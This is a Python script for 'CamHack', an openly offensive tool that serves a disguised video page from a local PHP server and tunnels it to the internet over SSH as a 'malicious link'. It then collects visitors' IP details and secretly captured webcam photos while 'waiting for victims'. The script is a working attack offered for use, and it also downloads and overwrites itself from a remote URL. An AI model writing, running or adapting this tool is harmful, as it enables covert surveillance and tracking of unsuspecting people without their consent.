import os, sys, time, socket, hashlib, subprocess, urllib.request

stop="\033[0m"
red="\033[91;1m"
cyan="\033[96;1m"
blue="\033[94;1m"
white="\033[97;1m"
green="\033[92;1m"
yellow="\033[93;1m"
purple="\033[95;1m"

add=f"{white}[{purple}+{white}]{cyan} "
error=f"{white}[{purple}-{white}]{red} "
success=f"{white}[{purple}√{white}]{green} "
info=f"\033[97;1m[{purple}•\033[97;1m]{green} "
note=f"\033[97;1m[{purple}!\033[97;1m]{purple} "

local = os.path.abspath(__file__)
remote = "https://github.com/evilfeonix/CamHack/raw/main/camhack.py"

def goSlow(F3):
    for a in F3 + '\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1./300)

def loading(F3):
    for x in F3:sys.stdout.write(x),sys.stdout.flush(),time.sleep(1./300)
    for a in '...'+'\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1)

def remote_Code(url):
   try:
      response = urllib.request.urlopen(url)
      data = response.read()
      return hashlib.md5(data).hexdigest()
   except Exception as e:
      pass

def local_Code(local):
   try:
      with open(local, 'rb') as f:
         data = f.read()
         return hashlib.md5(data).hexdigest()
   except Exception as e:
      pass

def update(): 
    remote_hash = remote_Code(remote)
    local_hash = local_Code(local)
    
    if remote_hash and local_hash and remote_hash == local_hash:
        time.sleep(2)
        return True
    else: return False

def goUpdate():
    try:
        urllib.request.urlretrieve(remote, local)
        time.sleep(3)
        goSlow(f'{info}CamHack Successfully Updated')
    except Exception as e:
        goSlow(f"{error}Error Updating CamHack: Network error{stop}\n")



def banner():
    os.system("clear || cls")
    goSlow(f"""
    {white}//   ) )    by evilfeonix      {purple}//    / /           {white}v[{purple}1.0{white}]{purple}           
   {white}//         ___      _   __     {purple}//___ / /  ___      ___     / ___  
  {white}//        //   ) ) // ) )  ) ) {purple}/ ___   / //   ) ) //   ) ) //\ \   
 {white}//        //   / / // / /  / / {purple}//    / / //   / / //       //  \ \  
{white}((____/ / ((___( ( // / /  / / {purple}//    / / ((___( ( ((____   //    \ \ 
            {white}[+] {purple}Subscribes to our Youtube Channels{white} [+]{stop} 
              {white}[+] {purple} https://evilfeonix.github.io{white} [+]{stop}           
    """)
    


def internet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception: return False

def startup():
    date=update()
    net=internet()
    if net:
        goSlow(f"{cyan}Status: {green}Online")
    else:
        goSlow(f"{cyan}Status: {red}Offline")

    if date:
        goSlow(f"{green}CamHack is up-to date\n")
    else:
        goSlow(f"{red}Update found in CamHack\n")
        ask=input(f"{add}Will you like to update CamHack ({white}y/N{cyan}):{purple} ")
        if ask.lower() in ['y','yes']:
            goUpdate()
        # else:goSlow("We fucking well hope you fucking knows what you fucking doing!")
        else:goSlow(f"{note}We hope say you konw wetin you don do!\n")
        # wetin be dis 
    
    dependencies()

def kill_Processors():
    os.system("killall -2 php > /dev/null 2>&1")
    os.system("killall -2 ssh > /dev/null 2>&1")
    

def dependencies():
     time.sleep(3)
     php=subprocess.run('php -h > /dev/null 2>&1',shell=True).returncode
     ssh=subprocess.run('ssh -h > /dev/null 2>&1',shell=True).returncode
     
     if php == 127:
         goSlow(f"{info}Opsy!, php is missing, please install it in order to continue running this script.\n{stop}")
         os.sys.exit(1)
     elif ssh == 127:
         goSlow(f"{info}Opsy!, ssh is missing, please install it in order to continue running this script.\n{stop}")
     else:
         pass

def redirection():
    goSlow(f"\n{info}For more information regardless to this tool")
    goSlow(f"{info}Please contact the author at \033[1;37mevilfeonix@gmail.com")
    goSlow(f"{info}Also follow us on github, star and fork this our hacking tools")
    loading(f"{info}Thank for using \033[1;37mCamHack{green}!, and again happy camera hacking") 
    evilfeonix="https://github.com/evilfeonix/CamHack" 
    os.system(f"xdg-open {evilfeonix}")
    os.sys.exit(0)

def catch_victims():
    loading(f"\n{info}Waiting for victims, Press Ctrl+C to quit") 
    time.sleep(1)

    try:
        img=0
        logs=""
        while True:
            time.sleep(0.1)
            if (os.path.exists("ip.txt")):
                with open("ip.txt","r") as f:
                    lines = f.readlines()
                    
                os.remove("ip.txt")

                loading(f"\n{success}Victims successfully visit our malicious link!") 
                for line in lines:
                    logs+=f"{line.strip()}"
                    goSlow(f"   {line.strip()}")

            
            time.sleep(0.1)
            if (os.path.exists("image.txt")):
            	os.remove("image.txt")
            	img+=1
            	goSlow(f"\n{success}Victims picture received!\033[0m")
                
                
            time.sleep(0.1)
            if (os.path.exists("error.txt")):
                with open("error.txt","r") as f:
                    lines = f.readlines()
                    
                os.remove("error.txt")

                loading(f"\n{success}Attention!..,") 
                for line in lines:
                    logs+=f"{line.strip()}"
                    goSlow(f"   {red}{line.strip()}")
                    
                break

    except KeyboardInterrupt:
        with open("victims_log.txt","a") as f:
            f.write("="*15)
            f.write(logs)
            
        goSlow(f"\n{cyan}Victims where captured {img}x times and all the photos can be found at CamHack/ directory\n")
            
        kill_Processors()    
        redirection()

def setTemp(url):
    with open("maliciouslink1","r") as f:
        mal_link=f.read()

    loading(f"{info}Preparing a template for the attack")
    time.sleep(2)
    mal_link=mal_link.strip() if mal_link else "Not Generated"
    lc_link="http://localhost:31301/" 
    os.system(f"sed 's+video_url+'{url}'+g' video.html > index2.html")

    goSlow(f'\n{info}Local link:\033[1;37m %s' % lc_link)
    goSlow(f'{info}Malicious link:\033[1;37m %s' % mal_link)
    os.remove("maliciouslink1")
    time.sleep(2)

    catch_victims()
    

def servers():
    loading(f"\n\n{info}Starting local server")
    os.system("fuser -k 31301/tcp > /dev/null 2>&1")
    os.system("php -S localhost:31301 > /dev/null 2>&1 &")
    time.sleep(3)

    loading(f"{info}Exposing local server to the world")
    os.system("ssh -R 80:localhost:31301 localhost.run 2> /dev/null > maliciouslink &")
    time.sleep(7)
    if os.path.getsize("maliciouslink") == 0:
        goSlow(f"{error}Failed to expose local server to the world")
        
    os.system("grep -o 'https://[a-zA-Z0-9.-]*' maliciouslink > maliciouslink1")
    os.remove("maliciouslink")

    
def CamHack():
    startup()
    loading(f"{success}{cyan}CamHack loading, please wait")
    time.sleep(5)
    banner()

    URL=input(f"{info}Copy and paste any online video URL here:{purple} ")
    servers()
    setTemp(URL)
    
try:
    if __name__ == "__main__":
        CamHack()
except KeyboardInterrupt:
    kill_Processors()
    redirection()
